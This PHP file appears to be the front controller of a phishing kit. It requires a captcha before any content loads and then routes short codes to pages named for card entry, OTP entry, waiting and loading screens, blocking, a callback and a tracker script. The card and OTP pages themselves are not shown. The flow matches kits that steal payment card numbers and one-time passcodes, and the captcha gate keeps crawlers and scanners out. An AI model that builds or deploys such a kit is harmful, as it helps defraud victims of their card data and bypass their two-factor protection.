<?php


session_start();

// Constantes
define('ROOT', __DIR__);
define('SYS', ROOT . '/sys');
define('HOME', ROOT . '/home');

// Charger le système de sécurité
require_once SYS . '/security.php';
require_once SYS . '/helpers.php';

// Route demandée (codes courts uniquement)
$r = $_GET['r'] ?? '';

// ==========================================
// ÉTAPE 1 : CAPTCHA OBLIGATOIRE
// ==========================================

if (!isCaptchaValidated()) {

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_submit'])) {
        $pos = floatval($_POST['pos'] ?? 0);
        $tok = $_POST['tok'] ?? '';

        if (validateCaptcha($pos, $tok)) {
            // Succès
            $_SESSION['captcha_ok'] = true;
            $_SESSION['captcha_time'] = time();
            redirect('/');
        } else {
            $captcha_error = 'Position incorrecte. Réessayez.';
        }
    }


    if (!isset($_SESSION['cap'])) {
        initCaptcha();
    }


    showCaptcha($captcha_error ?? '');
    exit();
}

// ==========================================
// ÉTAPE 2 : ROUTING
// ==========================================

// Routes
$routes = [
    '' => 'land.php',
    'h' => 'land.php',
    'c' => 'card.php',
    'o' => 'otp.php',
    'w' => 'wait.php',
    'l' => 'loading.php',
    'p' => 'post.php',
    'e' => 'exit.php',
    'x' => 'blocked.php',
    'api' => 'api.php',
    'status' => 'check_status.php',
    'action' => 'action.php',
    'js' => 'assets/js/tracker.js',
    'cb' => 'callback.php',
    'test' => 'test_routing.php',
];


if (!isset($routes[$r])) {
    http_response_code(404);
    die('404');
}


if (file_exists(ROOT . '/lib/config.php')) {
    require_once ROOT . '/lib/config.php';
}
if (file_exists(ROOT . '/main.php')) {
    require_once ROOT . '/main.php';
}


$file = ($r === 'js') ? ROOT . '/' . $routes[$r] : HOME . '/' . $routes[$r];

if (file_exists($file)) {
    if ($r === 'js') {
        header('Content-Type: application/javascript');
        readfile($file);
    } else {
        require $file;
    }
} else {
    http_response_code(404);
    die('404');
}
